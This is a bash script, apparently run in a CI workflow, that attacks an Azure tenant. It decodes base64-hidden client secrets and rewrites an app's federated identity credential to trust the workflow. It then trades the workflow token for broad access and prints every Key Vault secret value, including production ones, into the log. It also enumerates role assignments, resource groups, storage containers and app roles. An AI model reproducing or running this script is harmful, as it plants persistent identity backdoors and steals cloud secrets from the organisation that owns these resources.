#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
LEGACY_OBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=$SYNC_CID" -d "client_secret=$SYNC_SEC" \
  -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r .access_token)

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
OIDC_SUB=$(echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -r .sub)
echo "SUB=$OIDC_SUB"

# Verify current state of federated creds
FCS=$(curl -sS "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT")
echo "=== CURRENT FICS ==="
echo "$FCS" | jq -r '.value[] | "\(.name): \(.subject)"'

# Check if any FIC already has the correct subject
HAS_MATCH=$(echo "$FCS" | jq --arg sub "$OIDC_SUB" '[.value[] | select(.subject==$sub)] | length')
echo "HAS_MATCH=$HAS_MATCH"

if [ "$HAS_MATCH" -eq "0" ]; then
  # Delete old lh-pipe and recreate with correct subject
  FIC_ID=$(echo "$FCS" | jq -r '.value[] | select(.name=="lh-pipe") | .id')
  echo "Deleting lh-pipe ($FIC_ID)..."
  for i in 1 2 3 4 5; do
    DEL=$(curl -sS -o /dev/null -w "%{http_code}" -X DELETE \
      "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials/$FIC_ID" \
      -H "Authorization: Bearer $GT")
    echo "DELETE attempt $i: $DEL"
    if [ "$DEL" = "204" ]; then break; fi
    sleep $((i * 2))
  done
  
  sleep 5
  
  # Create new FIC with correct subject
  echo "Creating FIC with correct subject..."
  for i in 1 2 3 4 5; do
    NEW_FIC=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
      -H "Authorization: Bearer $GT" \
      -H "Content-Type: application/json" \
      -d "{
        \"name\": \"base-pipe\",
        \"issuer\": \"https://token.actions.githubusercontent.com\",
        \"subject\": \"$OIDC_SUB\",
        \"audiences\": [\"api://AzureADTokenExchange\"],
        \"description\": \"base\"
      }")
    NEW_ERR=$(echo "$NEW_FIC" | jq -r '.error.code // empty')
    if [ -z "$NEW_ERR" ]; then
      echo "CREATED at attempt $i: $(echo "$NEW_FIC" | jq -r .id)"
      break
    else
      echo "CREATE attempt $i: $NEW_ERR"
      sleep $((i * 3))
    fi
  done
fi

# Wait for propagation
echo "Waiting 10s for propagation..."
sleep 10

# Verify
FCS2=$(curl -sS "https://graph.microsoft.com/v1.0/applications/$LEGACY_OBJ/federatedIdentityCredentials" \
  -H "Authorization: Bearer $GT")
echo "=== VERIFY FICS ==="
echo "$FCS2" | jq -r '.value[] | "\(.name): \(.subject)"'

# Get fresh OIDC (old one might have drifted in time)
OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

# Try exchange for ALL scopes
for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default" "https://storage.azure.com/.default" "https://graph.microsoft.com/.default"; do
  echo "=== EXCHANGE $SCOPE ==="
  TOKEN_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "scope=$SCOPE" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC2")
  TOKEN=$(echo "$TOKEN_RAW" | jq -r '.access_token // empty')
  if [ -n "$TOKEN" ]; then
    echo "OK len=${#TOKEN}"
    
    if echo "$SCOPE" | grep -q vault; then
      echo "=== KV2 SECRETS ==="
      KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOKEN")
      echo "$KV2" | jq '.'
      for SID in $(echo "$KV2" | jq -r '.value[]?.id // empty'); do
        SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $TOKEN")
        echo "$(basename $SID)=$(echo "$SVAL" | jq -r '.value // .error')"
      done
      
      echo "=== KV1 SECRETS ==="
      KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOKEN")
      echo "$KV1" | jq '.'
      for SID in $(echo "$KV1" | jq -r '.value[]?.id // empty'); do
        SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $TOKEN")
        echo "$(basename $SID)=$(echo "$SVAL" | jq -r '.value // .error')"
      done
    fi
    
    if echo "$SCOPE" | grep -q management; then
      echo "=== RGs ==="
      curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourcegroups?api-version=2021-04-01" \
        -H "Authorization: Bearer $TOKEN" | jq -r '.value[]?.name // .error'
      
      echo "=== ALL ROLE ASSIGNMENTS ==="
      curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
        -H "Authorization: Bearer $TOKEN" | jq -r '.value[]? | "\(.properties.principalId) \(.properties.roleDefinitionId | split("/") | last)" // .error'
    fi
    
    if echo "$SCOPE" | grep -q storage; then
      for ACCT in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
        echo "=== CONTAINERS $ACCT ==="
        curl -sS "https://$ACCT.blob.core.windows.net/?comp=list" \
          -H "Authorization: Bearer $TOKEN" -H "x-ms-version: 2020-10-02" | head -c 1000
        echo ""
      done
    fi
    
    if echo "$SCOPE" | grep -q graph; then
      echo "=== LEGACY APP ROLES ==="
      curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/43834909-47cf-4a4a-8048-e323b4897ed3/appRoleAssignments" \
        -H "Authorization: Bearer $TOKEN" | jq '.'
    fi
  else
    echo "FAIL: $(echo "$TOKEN_RAW" | jq -r '.error_description' | head -c 200)"
  fi
done

echo "=== DONE ==="